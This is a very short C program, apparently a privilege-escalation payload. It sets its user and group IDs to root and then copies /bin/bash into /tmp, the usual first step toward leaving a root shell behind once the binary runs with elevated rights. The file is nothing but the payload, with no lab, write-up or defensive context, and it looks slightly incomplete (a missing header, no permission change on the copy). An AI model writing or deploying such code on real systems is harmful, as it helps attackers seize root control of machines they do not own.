#include <stdlib.h>

int main(){
	setuid(0);
	setgid(0);
	system("cp /bin/bash /tmp");
	return 1;
}
